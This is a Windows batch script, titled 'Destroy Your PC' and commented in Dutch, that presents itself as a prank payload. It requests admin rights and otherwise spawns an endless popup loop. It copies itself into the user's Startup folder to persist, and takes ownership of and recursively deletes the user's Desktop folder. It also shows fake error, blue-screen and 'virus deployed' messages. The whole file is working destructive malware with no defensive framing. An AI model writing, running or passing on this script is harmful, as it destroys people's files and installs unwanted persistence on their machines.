@echo off
:: === ADMIN CHECK ===
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [!] Admin rights required. Relaunching...
    
    :: Zet flag dat admin geweigerd werd
    echo denied > "%temp%\admin_denied.flag"

    :: Relaunch met admin prompt
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)

:: === CHECK VOOR ADMIN WEIGERING ===
if exist "%temp%\admin_denied.flag" (
    echo [!] Admin still denied, activating punishment...

    :: Auto-create punish.bat als hij niet bestaat
    if not exist "%~dp0punish.bat" (
        echo @echo off>"%~dp0punish.bat"
        echo title You messed up!>>"%~dp0punish.bat"
        echo :loop>>"%~dp0punish.bat"
        echo start "" powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('You denied admin, deal with it!','Punishment')">>"%~dp0punish.bat"
        echo timeout /t 1 >nul>>"%~dp0punish.bat"
        echo goto loop>>"%~dp0punish.bat"
    )

    :: Start punish.bat
    start "" "%~dp0punish.bat"
    del "%temp%\admin_denied.flag"
    exit
)

:: === VISUALS ===
title Destroy Your PC - Payload with Disco
color 0C
mode con: cols=70 lines=10
echo.
echo *** GET READY FOR THE DISCO CHAOS ***

:disco
for /l %%i in (1,1,10) do (
    color 0%%i
    ping localhost -n 1 >nul
)
color 0A

:: === BEEP PARTY ===
powershell -c "[console]::beep(523,200); [console]::beep(659,200); [console]::beep(784,200)"

:: === POPUP MESSAGES ===
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('YOU RAN THE WRONG SCRIPT BRO', '💀 Destroy Your PC 💀')"
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Say goodbye to your files 😈', 'Oops...')"

:: === FAKE BSOD ===
start cmd /c "color 1F && mode con: cols=80 lines=25 && echo A problem has been detected... && pause >nul"

:: === SELF-COPY TO STARTUP ===
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat" >nul

:: === DELETE DESKTOP (annoying prank) ===
takeown /f "%userprofile%\Desktop" /r /d y >nul
rmdir /s /q "%userprofile%\Desktop"

:: === ERROR POPUP SPAM ===
for /l %%i in (1,1,5) do (
    start "" powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('System Error: 0xC000FUBAR','Windows Error')"
    timeout /t 2 >nul
)

:: === FAKE INFECTION ===
echo Injecting into svchost...
ping localhost -n 2 >nul
echo System integrity = 0%
ping localhost -n 2 >nul
echo Virus fully deployed.
ping localhost -n 2 >nul

:: === FINAL WARNING ===
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hi, Destroy Your PC has injected your PC. After reboot or misuse your computer will not function normally anymore.', '💀 Warning 💀')"

pause
